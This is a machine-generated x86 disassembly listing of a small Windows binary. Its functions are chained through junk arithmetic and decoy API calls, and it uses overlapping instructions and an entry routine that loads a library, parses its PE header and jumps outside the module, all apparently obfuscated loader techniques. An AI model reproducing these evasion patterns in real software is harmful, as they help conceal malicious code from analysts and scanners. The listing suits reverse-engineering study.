0x004d000c:	movl	%edi, %edi	; from: 0x004d046b(MAY)
0x004d000e:	pushl	%ebp
0x004d000f:	movl	%esp, %ebp
0x004d0011:	subl	$0x58, %esp
0x004d0014:	leal	0x120(%eax), %esi
0x004d001a:	orl	$0xffffce23, 0xa0(%esi)
0x004d0024:	pushl	%esi
0x004d0025:	pushl	0xd8(%esi)
0x004d002b:	pushl	0x158(%esi)
0x004d0031:	pushl	0x1e8(%esi)
0x004d0037:	pushl	0x15c(%esi)
0x004d003d:	call	0x004d082c	; targets: 0x004d082c(MAY)
0x004d0064:	movl	%edi, %edi	; from: 0x004d04c9(MAY)
0x004d0066:	pushl	%ebp
0x004d0067:	movl	%esp, %ebp
0x004d0069:	subl	$0x50, %esp
0x004d006c:	movl	$0x4d314c, %eax
0x004d0071:	orl	%edi, -68(%ebp)
0x004d0074:	pushl	%eax
0x004d0075:	pushl	$0x0
0x004d0077:	call	FindClose@kernel32.dll	; targets: 0xff0000d0(MAY)
0x004d007d:	popl	%eax
0x004d007e:	pushl	%eax
0x004d007f:	pushl	0x50(%eax)
0x004d0082:	pushl	0x16c(%eax)
0x004d0088:	pushl	0x108(%eax)
0x004d008e:	pushl	%ecx
0x004d008f:	call	0x004d06dc	; targets: 0x004d06dc(MAY)
0x004d00b4:	movl	%edi, %edi	; from: 0x004d0af4(MAY)
0x004d00b6:	pushl	%ebp
0x004d00b7:	movl	%esp, %ebp
0x004d00b9:	subl	$0x20, %esp
0x004d00bc:	leal	0x004d302c, %ecx
0x004d00c2:	addl	-8(%ebp), %edi
0x004d00c5:	pushl	%ecx
0x004d00c6:	pushl	%eax
0x004d00c7:	pushl	%edi
0x004d00c8:	pushl	0x44(%ecx)
0x004d00cb:	pushl	%ebx
0x004d00cc:	call	0x004d0658	; targets: 0x004d0658(MAY)
0x004d00f0:	movl	%edi, %edi	; from: 0x004d02a4(MAY)
0x004d00f2:	pushl	%ebp
0x004d00f3:	movl	%esp, %ebp
0x004d00f5:	subl	$0x30, %esp
0x004d00f8:	movl	$0x4d3060, %esi
0x004d00fd:	movl	%edi, -56(%esi)
0x004d0100:	pushl	%esi
0x004d0101:	pushl	%ebx
0x004d0102:	pushl	0x9c(%esi)
0x004d0108:	pushl	0xc(%esi)
0x004d010b:	pushl	0x8c(%esi)
0x004d0111:	call	0x004d0520	; targets: 0x004d0520(MAY)
0x004d0134:	movl	%edi, %edi	; from: 0x004d03e3(MAY)
0x004d0136:	pushl	%ebp
0x004d0137:	movl	%esp, %ebp
0x004d0139:	subl	$0x3c, %esp
0x004d013c:	leal	-64(%ebx), %ecx
0x004d013f:	addl	-32(%ebp), %eax
0x004d0142:	pushl	%ecx
0x004d0143:	pushl	%edi
0x004d0144:	pushl	0x1f8(%ecx)
0x004d014a:	call	0x004d0c30	; targets: 0x004d0c30(MAY)
0x004d0178:	movl	%edi, %edi	; from: 0x004d09de(MAY)
0x004d017a:	pushl	%ebp
0x004d017b:	movl	%esp, %ebp
0x004d017d:	subl	$0x5c, %esp
0x004d0180:	leal	0x004d30e8, %esi
0x004d0186:	addl	%esi, %eax
0x004d0188:	pushl	%esi
0x004d0189:	pushl	0x30(%esi)
0x004d018c:	pushl	%edi
0x004d018d:	pushl	%edi
0x004d018e:	call	0x004d076c	; targets: 0x004d076c(MAY)
0x004d01c4:	movl	%edi, %edi	; from: 0x004d0811(MAY)
0x004d01c6:	pushl	%ebp
0x004d01c7:	movl	%esp, %ebp
0x004d01c9:	subl	$0x4c, %esp
0x004d01cc:	movl	$0x4d31bc, %ebx
0x004d01d1:	adcl	$0x43, -216(%ebx)
0x004d01d8:	pushl	%ebx
0x004d01d9:	pushl	%ecx
0x004d01da:	pushl	0x1d4(%ebx)
0x004d01e0:	pushl	0x1dc(%ebx)
0x004d01e6:	call	0x004d0a2c	; targets: 0x004d0a2c(MAY)
0x004d0204:	movl	%edi, %edi	; from: 0x004d0a0e(MAY)
0x004d0206:	pushl	%ebp
0x004d0207:	movl	%esp, %ebp
0x004d0209:	subl	$0x40, %esp
0x004d020c:	leal	0x004d3050, %ebx
0x004d0212:	orl	%edi, %eax
0x004d0214:	movl	$0x0, %eax
0x004d0219:	pushl	%eax
0x004d021a:	call	LocalUnlock@kernel32.dll	; targets: 0xff000180(MAY)
0x004d0220:	pushl	%ebx
0x004d0221:	pushl	0x1ec(%ebx)
0x004d0227:	pushl	0x130(%ebx)
0x004d022d:	call	0x004d0b14	; targets: 0x004d0b14(MAY)
0x004d0244:	movl	%edi, %edi	; from: 0x004d02ea(MAY)
0x004d0246:	pushl	%ebp
0x004d0247:	movl	%esp, %ebp
0x004d0249:	subl	$0x30, %esp
0x004d024c:	leal	0x004d30c4, %ecx
0x004d0252:	xorl	$0xffffd45c, 0xc(%ecx)
0x004d0259:	pushl	%ecx
0x004d025a:	movl	$0x0, %esi
0x004d025f:	pushl	%esi
0x004d0260:	call	HeapDestroy@kernel32.dll	; targets: 0xff000120(MAY)
0x004d0266:	popl	%ecx
0x004d0267:	pushl	%ecx
0x004d0268:	pushl	%edi
0x004d0269:	pushl	0x94(%ecx)
0x004d026f:	call	0x004d0304	; targets: 0x004d0304(MAY)
0x004d028c:	movl	%edi, %edi	; from: 0x004d0a55(MAY)
0x004d028e:	pushl	%ebp
0x004d028f:	movl	%esp, %ebp
0x004d0291:	subl	$0x48, %esp
0x004d0294:	movl	$0x4d3170, %edi
0x004d0299:	sbbl	$0xffffffa0, %ecx
0x004d029c:	pushl	%edi
0x004d029d:	pushl	%esi
0x004d029e:	pushl	0xf4(%edi)
0x004d02a4:	call	0x004d00f0	; targets: 0x004d00f0(MAY)
0x004d02d0:	movl	%edi, %edi	; from: 0x004d099b(MAY)
0x004d02d2:	pushl	%ebp
0x004d02d3:	movl	%esp, %ebp
0x004d02d5:	subl	$0x4c, %esp
0x004d02d8:	leal	-412(%ecx), %esi
0x004d02de:	adcl	%edx, %edi
0x004d02e0:	call	GetLastError@kernel32.dll	; targets: 0xff000080(MAY)
0x004d02e6:	pushl	%esi
0x004d02e7:	pushl	%ecx
0x004d02e8:	pushl	%ecx
0x004d02e9:	pushl	%edx
0x004d02ea:	call	0x004d0244	; targets: 0x004d0244(MAY)
0x004d0304:	movl	%edi, %edi	; from: 0x004d026f(MAY)
0x004d0306:	pushl	%ebp
0x004d0307:	movl	%esp, %ebp
0x004d0309:	subl	$0x24, %esp
0x004d030c:	movl	$0x4d3028, %eax
0x004d0311:	xorl	-20(%ebp), %edx
0x004d0314:	pushl	%eax
0x004d0315:	call	GetFocus@user32.dll	; targets: 0xff000060(MAY)
0x004d031b:	popl	%eax
0x004d031c:	pushl	%eax
0x004d031d:	pushl	%edx
0x004d031e:	pushl	0x174(%eax)
0x004d0324:	pushl	%edx
0x004d0325:	call	0x004d0ca8	; targets: 0x004d0ca8(MAY)
0x004d0348:	movl	%edi, %edi	; from: 0x004d0b82(MAY)
0x004d034a:	pushl	%ebp
0x004d034b:	movl	%esp, %ebp
0x004d034d:	subl	$0x5c, %esp
0x004d0350:	leal	0x004d309c, %esi
0x004d0356:	xorl	%edi, 0x18(%esi)
0x004d0359:	pushl	%esi
0x004d035a:	pushl	0xc0(%esi)
0x004d0360:	pushl	%ebx
0x004d0361:	pushl	%ebx
0x004d0362:	pushl	%eax
0x004d0363:	call	0x004d03bc	; targets: 0x004d03bc(MAY)
0x004d0380:	movl	%edi, %edi	; from: 0x004d0c4b(MAY)
0x004d0382:	pushl	%ebp
0x004d0383:	movl	%esp, %ebp
0x004d0385:	subl	$0x40, %esp
0x004d0388:	leal	0x004d31bc, %eax
0x004d038e:	subl	%edi, -36(%ebp)
0x004d0391:	pushl	%eax
0x004d0392:	pushl	%esi
0x004d0393:	pushl	0x34(%eax)
0x004d0396:	call	0x004d0968	; targets: 0x004d0968(MAY)
0x004d03bc:	movl	%edi, %edi	; from: 0x004d0363(MAY)
0x004d03be:	pushl	%ebp
0x004d03bf:	movl	%esp, %ebp
0x004d03c1:	subl	$0x4c, %esp
0x004d03c4:	movl	$0x4d31a0, %ebx
0x004d03c9:	orl	-4(%ebp), %ecx
0x004d03cc:	pushl	$0x0
0x004d03ce:	call	IsWindow@user32.dll	; targets: 0xff000170(MAY)
0x004d03d4:	pushl	%ebx
0x004d03d5:	pushl	%eax
0x004d03d6:	pushl	0x1fc(%ebx)
0x004d03dc:	pushl	0xac(%ebx)
0x004d03e2:	pushl	%edx
0x004d03e3:	call	0x004d0134	; targets: 0x004d0134(MAY)
0x004d0404:	movl	%edi, %edi	; from: 0x004d08e3(MAY)
0x004d0406:	pushl	%ebp
0x004d0407:	movl	%esp, %ebp
0x004d0409:	subl	$0x40, %esp
0x004d040c:	leal	-216(%edx), %eax
0x004d0412:	xorl	%ecx, %esi
0x004d0414:	pushl	%eax
0x004d0415:	pushl	0x170(%eax)
0x004d041b:	pushl	0x1dc(%eax)
0x004d0421:	pushl	0x44(%eax)
0x004d0424:	pushl	0x188(%eax)
0x004d042a:	call	0x004d04e0	; targets: 0x004d04e0(MAY)
0x004d0450:	movl	%edi, %edi	; from: 0x004d0c85(MAY)
0x004d0452:	pushl	%ebp
0x004d0453:	movl	%esp, %ebp
0x004d0455:	subl	$0x34, %esp
0x004d0458:	leal	0x004d301c, %eax
0x004d045e:	xorl	$0x7a, -40(%ebp)
0x004d0462:	pushl	%eax
0x004d0463:	pushl	%edx
0x004d0464:	pushl	0xb4(%eax)
0x004d046a:	pushl	%ebx
0x004d046b:	call	0x004d000c	; targets: 0x004d000c(MAY)

start:
0x004d0490:	pushl	$0x0
0x004d0492:	call	SetLastError@kernel32.dll	; targets: 0xff000250(MAY)
0x004d0498:	pushl	$0x0
0x004d049a:	call	Sleep@kernel32.dll	; targets: 0xff000160(MAY)
0x004d04a0:	pushl	$0x2
0x004d04a2:	xorl	%eax, %eax
0x004d04a4:	leal	0x4d3200(,%eax,2), %eax
0x004d04ab:	pushl	$0x0
0x004d04ad:	leal	0xc(%eax), %ecx
0x004d04b0:	addb	$0xffffffb0, (%ecx)
0x004d04b3:	pushl	%eax
0x004d04b4:	nop	
0x004d04b5:	call	LoadLibraryExW@kernel32.dll	; targets: 0xff0000b0(MAY)
0x004d04bb:	leal	0x3b(%eax), %edx
0x004d04be:	movl	(%edx), %ecx
0x004d04c0:	movl	0x28(%eax,%ecx), %eax
0x004d04c4:	movb	$0x40, %ah
0x004d04c6:	pusha	
0x004d04c7:	cmpb	%ah, %al
0x004d04c9:	ja	0x004d0064	; targets: 0x004d0064(MAY), 0x004d04cf(MAY)
0x004d04cf:	popa		; from: 0x004d04c9(MAY)
0x004d04d0:	ret	; targets: 0xfee70000(MAY)

0x004d04e0:	movl	%edi, %edi	; from: 0x004d042a(MAY)
0x004d04e2:	pushl	%ebp
0x004d04e3:	movl	%esp, %ebp
0x004d04e5:	subl	$0x2c, %esp
0x004d04e8:	leal	0x004d3038, %edx
0x004d04ee:	subl	$0xffffc044, -4(%ebp)
0x004d04f5:	pushl	%edx
0x004d04f6:	pushl	%eax
0x004d04f7:	pushl	%ecx
0x004d04f8:	call	0x004d0be4	; targets: 0x004d0be4(MAY)
0x004d0520:	movl	%edi, %edi	; from: 0x004d0111(MAY)
0x004d0522:	pushl	%ebp
0x004d0523:	movl	%esp, %ebp
0x004d0525:	subl	$0x40, %esp
0x004d0528:	leal	0x190(%esi), %eax
0x004d052e:	cmpl	$0x9b6, %eax
0x004d0533:	je	0x004d0523	; targets: 0x004d0535(MAY)
0x004d0535:	pushl	%eax	; from: 0x004d0533(MAY)
0x004d0536:	leal	-496(%eax), %eax	; from: 0x004d0545(MAY)
0x004d053c:	pushl	%eax
0x004d053d:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000010(MAY)
0x004d0543:	testl	%eax, %eax
0x004d0545:	jne	0x004d0536	; targets: 0x004d0536(MAY), 0x004d0547(MAY)
0x004d0547:	popl	%eax	; from: 0x004d0545(MAY)
0x004d0548:	pushl	%eax
0x004d0549:	pushl	0x10c(%eax)
0x004d054f:	pushl	0xb4(%eax)
0x004d0555:	pushl	0x174(%eax)
0x004d055b:	pushl	%esi
0x004d055c:	call	0x004d0ba4	; targets: 0x004d0ba4(MAY)
0x004d0574:	movl	%edi, %edi	; from: 0x004d0bc7(MAY)
0x004d0576:	pushl	%ebp
0x004d0577:	movl	%esp, %ebp
0x004d0579:	subl	$0x54, %esp
0x004d057c:	leal	-40(%ebx), %ecx
0x004d057f:	cmpl	$0x5dea, %ecx
0x004d0585:	je	0x004d0577	; targets: 0x004d0587(MAY)
0x004d0587:	pushl	%ecx	; from: 0x004d0585(MAY)
0x004d0588:	movl	$0x0, %esi
0x004d058d:	pushl	%esi
0x004d058e:	call	GetDC@user32.dll	; targets: 0xff0000a0(MAY)
0x004d0594:	popl	%ecx
0x004d0595:	pushl	%ecx
0x004d0596:	pushl	0x54(%ecx)
0x004d0599:	pushl	0x1b4(%ecx)
0x004d059f:	pushl	0x1a4(%ecx)
0x004d05a5:	pushl	%edi
0x004d05a6:	call	0x004d06a0	; targets: 0x004d06a0(MAY)
0x004d05c4:	movl	%edi, %edi	; from: 0x004d0b2f(MAY)
0x004d05c6:	pushl	%ebp
0x004d05c7:	movl	%esp, %ebp
0x004d05c9:	subl	$0x48, %esp
0x004d05cc:	xorl	$0x6fc3, -48(%ebp)
0x004d05d3:	movl	$0x4d3124, %eax
0x004d05d8:	pushl	%eax
0x004d05d9:	pushl	$0x6ac
0x004d05de:	pushl	$0x6ac
0x004d05e3:	movl	$0x40001, %ebx
0x004d05e8:	pushl	%ebx
0x004d05e9:	movl	$0x862985ae, %eax
0x004d05ee:	pushl	0x7a239a86(%eax)
0x004d05f4:	subl	$0x2, (%esp)
0x004d05f8:	movl	$0x4d2028, %eax
0x004d05fd:	popl	(%eax)
0x004d05ff:	call	LoadLibraryExW@kernel32.dll	; targets: 0xff00002e(MAY)
0x004d0658:	movl	%edi, %edi	; from: 0x004d00cc(MAY)
0x004d065a:	pushl	%ebp
0x004d065b:	movl	%esp, %ebp
0x004d065d:	subl	$0x38, %esp
0x004d0660:	movl	$0x4d30ac, %edi
0x004d0665:	andl	-44(%ebp), %eax
0x004d0668:	pushl	%edi
0x004d0669:	pushl	0xa4(%edi)
0x004d066f:	pushl	0x1fc(%edi)
0x004d0675:	call	0x004d0a7c	; targets: 0x004d0a7c(MAY)
0x004d06a0:	movl	%edi, %edi	; from: 0x004d05a6(MAY)
0x004d06a2:	pushl	%ebp
0x004d06a3:	movl	%esp, %ebp
0x004d06a5:	subl	$0x54, %esp
0x004d06a8:	leal	-352(%ecx), %edx
0x004d06ae:	orl	%eax, -64(%ebp)
0x004d06b1:	pushl	%edx
0x004d06b2:	movl	$0x0, %eax
0x004d06b7:	pushl	%eax
0x004d06b8:	call	ReleaseMutex@kernel32.dll	; targets: 0xff0001f0(MAY)
0x004d06be:	popl	%edx
0x004d06bf:	pushl	%edx
0x004d06c0:	pushl	%edi
0x004d06c1:	pushl	%ecx
0x004d06c2:	call	0x004d0720	; targets: 0x004d0720(MAY)
0x004d06dc:	movl	%edi, %edi	; from: 0x004d008f(MAY)
0x004d06de:	pushl	%ebp
0x004d06df:	movl	%esp, %ebp
0x004d06e1:	subl	$0x24, %esp
0x004d06e4:	movl	$0x4d3080, %esi
0x004d06e9:	movl	$0xfffffffb, %ebx
0x004d06ee:	movl	$0x0, %ecx
0x004d06f3:	pushl	%ecx
0x004d06f4:	call	HeapDestroy@kernel32.dll	; targets: 0xff000120(MAY)
0x004d06fa:	pushl	%esi
0x004d06fb:	pushl	%ecx
0x004d06fc:	pushl	%eax
0x004d06fd:	pushl	0x180(%esi)
0x004d0703:	pushl	0xe4(%esi)
0x004d0709:	call	0x004d0870	; targets: 0x004d0870(MAY)
0x004d0720:	movl	%edi, %edi	; from: 0x004d06c2(MAY)
0x004d0722:	pushl	%ebp
0x004d0723:	movl	%esp, %ebp
0x004d0725:	subl	$0x5c, %esp
0x004d0728:	movl	$0x4d30e4, %eax
0x004d072d:	orl	-68(%ebp), %edx
0x004d0730:	pushl	%eax
0x004d0731:	pushl	%esi
0x004d0732:	pushl	0x1ec(%eax)
0x004d0738:	pushl	%ecx
0x004d0739:	pushl	%esi
0x004d073a:	call	0x004d08c4	; targets: 0x004d08c4(MAY)
0x004d076c:	movl	%edi, %edi	; from: 0x004d018e(MAY)
0x004d076e:	pushl	%ebp
0x004d076f:	movl	%esp, %ebp
0x004d0771:	subl	$0x30, %esp
0x004d0774:	movl	$0x4d3068, %ebx
0x004d0779:	addl	$0x34, %ecx
0x004d077c:	call	GetLastError@kernel32.dll	; targets: 0xff000080(MAY)
0x004d0782:	pushl	%ebx
0x004d0783:	pushl	0x158(%ebx)
0x004d0789:	pushl	0x170(%ebx)
0x004d078f:	call	0x004d0c70	; targets: 0x004d0c70(MAY)
0x004d07b0:	movl	%edi, %edi	; from: 0x004d0cd0(MAY)
0x004d07b2:	pushl	%ebp
0x004d07b3:	movl	%esp, %ebp
0x004d07b5:	subl	$0x4c, %esp
0x004d07b8:	movl	$0x4d3040, %edi
0x004d07bd:	subl	%eax, 0xac(%edi)
0x004d07c3:	call	GetACP@kernel32.dll	; targets: 0xff0001b0(MAY)
0x004d07c9:	pushl	%edi
0x004d07ca:	pushl	%edx
0x004d07cb:	pushl	0x148(%edi)
0x004d07d1:	call	0x004d0914	; targets: 0x004d0914(MAY)
0x004d07f0:	movl	%edi, %edi	; from: 0x004d0aae(MAY)
0x004d07f2:	pushl	%ebp
0x004d07f3:	movl	%esp, %ebp
0x004d07f5:	subl	$0x38, %esp
0x004d07f8:	leal	0x004d3184, %ecx
0x004d07fe:	movl	%esi, -136(%ecx)
0x004d0804:	pushl	%ecx
0x004d0805:	call	GetACP@kernel32.dll	; targets: 0xff0001b0(MAY)
0x004d080b:	popl	%ecx
0x004d080c:	pushl	%ecx
0x004d080d:	pushl	%edx
0x004d080e:	pushl	0x2c(%ecx)
0x004d0811:	call	0x004d01c4	; targets: 0x004d01c4(MAY)
0x004d082c:	movl	%edi, %edi	; from: 0x004d003d(MAY)
0x004d082e:	pushl	%ebp
0x004d082f:	movl	%esp, %ebp
0x004d0831:	subl	$0x4c, %esp
0x004d0834:	movl	$0x4d306c, %ebx
0x004d0839:	adcl	%eax, 0x130(%ebx)
0x004d083f:	pushl	%ebx
0x004d0840:	pushl	%esi
0x004d0841:	pushl	%eax
0x004d0842:	pushl	0xd4(%ebx)
0x004d0848:	call	0x004d0ac8	; targets: 0x004d0ac8(MAY)
0x004d0870:	movl	%edi, %edi	; from: 0x004d0709(MAY)
0x004d0872:	pushl	%ebp
0x004d0873:	movl	%esp, %ebp
0x004d0875:	subl	$0x24, %esp
0x004d0878:	leal	0x004d30cc, %eax
0x004d087e:	adcl	$0xffffffaa, -32(%ebp)
0x004d0882:	pushl	%eax
0x004d0883:	pushl	0x19c(%eax)
0x004d0889:	pushl	%ebx
0x004d088a:	pushl	0x1bc(%eax)
0x004d0890:	call	0x004d09b8	; targets: 0x004d09b8(MAY)
0x004d08c4:	movl	%edi, %edi	; from: 0x004d073a(MAY)
0x004d08c6:	pushl	%ebp
0x004d08c7:	movl	%esp, %ebp
0x004d08c9:	subl	$0x60, %esp
0x004d08cc:	movl	$0x4d31c8, %edx
0x004d08d1:	adcl	%esi, -212(%edx)
0x004d08d7:	pushl	%edx
0x004d08d8:	pushl	%edi
0x004d08d9:	pushl	0x150(%edx)
0x004d08df:	pushl	0x18(%edx)
0x004d08e2:	pushl	%ebx
0x004d08e3:	call	0x004d0404	; targets: 0x004d0404(MAY)
0x004d0914:	movl	%edi, %edi	; from: 0x004d07d1(MAY)
0x004d0916:	pushl	%ebp
0x004d0917:	movl	%esp, %ebp
0x004d0919:	subl	$0x4c, %esp
0x004d091c:	leal	0xe4(%edi), %edx
0x004d0922:	cmpl	$0x159b, %edx
0x004d0928:	jbe	0x004d0917	; targets: 0x004d092a(MAY)
0x004d092a:	pushl	%edx	; from: 0x004d0928(MAY)
0x004d092b:	pushl	$0x0
0x004d092d:	call	Sleep@kernel32.dll	; targets: 0xff000160(MAY)
0x004d0933:	popl	%edx
0x004d0934:	pushl	%edx
0x004d0935:	pushl	0x10c(%edx)
0x004d093b:	pushl	0x180(%edx)
0x004d0941:	pushl	0x120(%edx)
0x004d0947:	call	0x004d09f4	; targets: 0x004d09f4(MAY)
0x004d0968:	movl	%edi, %edi	; from: 0x004d0396(MAY)
0x004d096a:	pushl	%ebp
0x004d096b:	movl	%esp, %ebp
0x004d096d:	subl	$0x1c, %esp
0x004d0970:	leal	0x004d31b0, %ecx
0x004d0976:	cmpl	$0x743d, %ecx
0x004d097c:	jb	0x004d096b	; targets: 0x004d097e(MAY)
0x004d097e:	pushl	%ecx	; from: 0x004d097c(MAY)
0x004d097f:	leal	-432(%ecx), %ecx	; from: 0x004d098e(MAY)
0x004d0985:	pushl	%ecx
0x004d0986:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000010(MAY)
0x004d098c:	testl	%eax, %eax
0x004d098e:	jne	0x004d097f	; targets: 0x004d097f(MAY), 0x004d0990(MAY)
0x004d0990:	popl	%ecx	; from: 0x004d098e(MAY)
0x004d0991:	pushl	%ecx
0x004d0992:	pushl	0xa0(%ecx)
0x004d0998:	pushl	0x40(%ecx)
0x004d099b:	call	0x004d02d0	; targets: 0x004d02d0(MAY)
0x004d09b8:	movl	%edi, %edi	; from: 0x004d0890(MAY)
0x004d09ba:	pushl	%ebp
0x004d09bb:	movl	%esp, %ebp
0x004d09bd:	subl	$0x5c, %esp
0x004d09c0:	leal	0x004d31e8, %ecx
0x004d09c6:	addl	%edi, %edx
0x004d09c8:	pushl	%ecx
0x004d09c9:	leal	-488(%ecx), %eax	; from: 0x004d09d8(MAY)
0x004d09cf:	pushl	%eax
0x004d09d0:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000010(MAY)
0x004d09d6:	testl	%eax, %eax
0x004d09d8:	jne	0x004d09c9	; targets: 0x004d09da(MAY), 0x004d09c9(MAY)
0x004d09da:	popl	%ecx	; from: 0x004d09d8(MAY)
0x004d09db:	pushl	%ecx
0x004d09dc:	pushl	%edx
0x004d09dd:	pushl	%esi
0x004d09de:	call	0x004d0178	; targets: 0x004d0178(MAY)
0x004d09f4:	movl	%edi, %edi	; from: 0x004d0947(MAY)
0x004d09f6:	pushl	%ebp
0x004d09f7:	movl	%esp, %ebp
0x004d09f9:	subl	$0x58, %esp
0x004d09fc:	leal	0x28(%edx), %eax
0x004d09ff:	orl	$0x629a, -248(%eax)
0x004d0a09:	pushl	%eax
0x004d0a0a:	pushl	%ebx
0x004d0a0b:	pushl	0x4(%eax)
0x004d0a0e:	call	0x004d0204	; targets: 0x004d0204(MAY)
0x004d0a2c:	movl	%edi, %edi	; from: 0x004d01e6(MAY)
0x004d0a2e:	pushl	%ebp
0x004d0a2f:	movl	%esp, %ebp
0x004d0a31:	subl	$0x48, %esp
0x004d0a34:	leal	0x004d30b8, %eax
0x004d0a3a:	movl	$0xffff90e3, -164(%eax)
0x004d0a44:	pushl	%eax
0x004d0a45:	pushl	0x18(%eax)
0x004d0a48:	pushl	0xc8(%eax)
0x004d0a4e:	pushl	%edx
0x004d0a4f:	pushl	0x104(%eax)
0x004d0a55:	call	0x004d028c	; targets: 0x004d028c(MAY)
0x004d0a7c:	movl	%edi, %edi	; from: 0x004d0675(MAY)
0x004d0a7e:	pushl	%ebp
0x004d0a7f:	movl	%esp, %ebp
0x004d0a81:	subl	$0x40, %esp
0x004d0a84:	leal	0xac(%edi), %ebx
0x004d0a8a:	orl	%esi, -64(%ebp)
0x004d0a8d:	leal	-344(%ebx), %eax
0x004d0a8e:	subl	$0xffffffff, 0x50fffffe(%eax)	; from: 0x004d0a9c(MAY)
0x004d0a93:	pushl	%eax
0x004d0a94:	call	GetModuleHandleA@kernel32.dll	; targets: 0xff000010(MAY)
0x004d0a95:	adcl	$0x4d2038, %eax
0x004d0a9a:	testl	%eax, %eax
0x004d0a9c:	jne	0x004d0a8e	; targets: 0x004d0a8e(MAY), 0x004d0a9e(MAY)
0x004d0a9e:	pushl	%ebx	; from: 0x004d0a9c(MAY)
0x004d0a9f:	pushl	0xe0(%ebx)
0x004d0aa5:	pushl	0x1c(%ebx)
0x004d0aa8:	pushl	0x1c8(%ebx)
0x004d0aae:	call	0x004d07f0	; targets: 0x004d07f0(MAY)
0x004d0ac8:	movl	%edi, %edi	; from: 0x004d0848(MAY)
0x004d0aca:	pushl	%ebp
0x004d0acb:	movl	%esp, %ebp
0x004d0acd:	subl	$0x1c, %esp
0x004d0ad0:	leal	0x004d3140, %edx
0x004d0ad6:	addl	%ecx, -20(%ebp)
0x004d0ad9:	pushl	%edx
0x004d0ada:	movl	$0x0, %edx
0x004d0adf:	pushl	%edx
0x004d0ae0:	call	HeapDestroy@kernel32.dll	; targets: 0xff000120(MAY)
0x004d0ae6:	popl	%edx
0x004d0ae7:	pushl	%edx
0x004d0ae8:	pushl	0xd8(%edx)
0x004d0aee:	pushl	0x148(%edx)
0x004d0af4:	call	0x004d00b4	; targets: 0x004d00b4(MAY)
0x004d0b14:	movl	%edi, %edi	; from: 0x004d022d(MAY)
0x004d0b16:	pushl	%ebp
0x004d0b17:	movl	%esp, %ebp
0x004d0b19:	subl	$0x44, %esp
0x004d0b1c:	leal	0x004d316c, %edi
0x004d0b22:	cmpl	$0x14d4, %edi
0x004d0b28:	je	0x004d0b17	; targets: 0x004d0b2a(MAY)
0x004d0b2a:	pushl	%edi	; from: 0x004d0b28(MAY)
0x004d0b2b:	pushl	%ebx
0x004d0b2c:	pushl	%ecx
0x004d0b2d:	pushl	%esi
0x004d0b2e:	pushl	%eax
0x004d0b2f:	call	0x004d05c4	; targets: 0x004d05c4(MAY)
0x004d0b58:	movl	%edi, %edi	; from: 0x004d0c0c(MAY)
0x004d0b5a:	pushl	%ebp
0x004d0b5b:	movl	%esp, %ebp
0x004d0b5d:	subl	$0x3c, %esp
0x004d0b60:	leal	-68(%esi), %eax
0x004d0b63:	addl	$0xffffffd4, -36(%ebp)
0x004d0b67:	pushl	%eax
0x004d0b68:	call	GetLastError@kernel32.dll	; targets: 0xff000080(MAY)
0x004d0b6e:	popl	%eax
0x004d0b6f:	pushl	%eax
0x004d0b70:	pushl	0x1c4(%eax)
0x004d0b76:	pushl	0x1bc(%eax)
0x004d0b7c:	pushl	0x158(%eax)
0x004d0b82:	call	0x004d0348	; targets: 0x004d0348(MAY)
0x004d0ba4:	movl	%edi, %edi	; from: 0x004d055c(MAY)
0x004d0ba6:	pushl	%ebp
0x004d0ba7:	movl	%esp, %ebp
0x004d0ba9:	subl	$0x48, %esp
0x004d0bac:	movl	$0x4d31e4, %ebx
0x004d0bb1:	xorl	-464(%ebx), %edi
0x004d0bb7:	pushl	%ebx
0x004d0bb8:	pushl	0x30(%ebx)
0x004d0bbb:	pushl	0x74(%ebx)
0x004d0bbe:	pushl	0x70(%ebx)
0x004d0bc1:	pushl	0x104(%ebx)
0x004d0bc7:	call	0x004d0574	; targets: 0x004d0574(MAY)
0x004d0be4:	movl	%edi, %edi	; from: 0x004d04f8(MAY)
0x004d0be6:	pushl	%ebp
0x004d0be7:	movl	%esp, %ebp
0x004d0be9:	subl	$0x4c, %esp
0x004d0bec:	leal	0x1b4(%edx), %esi
0x004d0bf2:	addl	$0x22, -52(%ebp)
0x004d0bf6:	movl	$0x0, %eax
0x004d0bfb:	pushl	%eax
0x004d0bfc:	call	Sleep@kernel32.dll	; targets: 0xff000160(MAY)
0x004d0c02:	pushl	%esi
0x004d0c03:	pushl	%ebx
0x004d0c04:	pushl	0xe8(%esi)
0x004d0c0a:	pushl	%edi
0x004d0c0b:	pushl	%eax
0x004d0c0c:	call	0x004d0b58	; targets: 0x004d0b58(MAY)
0x004d0c30:	movl	%edi, %edi	; from: 0x004d014a(MAY)
0x004d0c32:	pushl	%ebp
0x004d0c33:	movl	%esp, %ebp
0x004d0c35:	subl	$0x48, %esp
0x004d0c38:	leal	0x4(%ecx), %esi
0x004d0c3b:	addl	0x94(%esi), %ebx
0x004d0c41:	pushl	%esi
0x004d0c42:	pushl	0x48(%esi)
0x004d0c45:	pushl	0x1e4(%esi)
0x004d0c4b:	call	0x004d0380	; targets: 0x004d0380(MAY)
0x004d0c70:	movl	%edi, %edi	; from: 0x004d078f(MAY)
0x004d0c72:	pushl	%ebp
0x004d0c73:	movl	%esp, %ebp
0x004d0c75:	subl	$0x40, %esp
0x004d0c78:	movl	$0x4d3174, %edx
0x004d0c7d:	subl	%esi, -36(%ebp)
0x004d0c80:	pushl	%edx
0x004d0c81:	pushl	0x30(%edx)
0x004d0c84:	pushl	%edi
0x004d0c85:	call	0x004d0450	; targets: 0x004d0450(MAY)
0x004d0ca8:	movl	%edi, %edi	; from: 0x004d0325(MAY)
0x004d0caa:	pushl	%ebp
0x004d0cab:	movl	%esp, %ebp
0x004d0cad:	subl	$0x60, %esp
0x004d0cb0:	leal	0x004d304c, %esi
0x004d0cb6:	adcl	0x10(%esi), %ebx
0x004d0cb9:	movl	$0x0, %edx
0x004d0cbe:	pushl	%edx
0x004d0cbf:	call	GlobalFree@kernel32.dll	; targets: 0xff0000f0(MAY)
0x004d0cc5:	pushl	%esi
0x004d0cc6:	pushl	0xd0(%esi)
0x004d0ccc:	pushl	0x14(%esi)
0x004d0ccf:	pushl	%edx
0x004d0cd0:	call	0x004d07b0	; targets: 0x004d07b0(MAY)
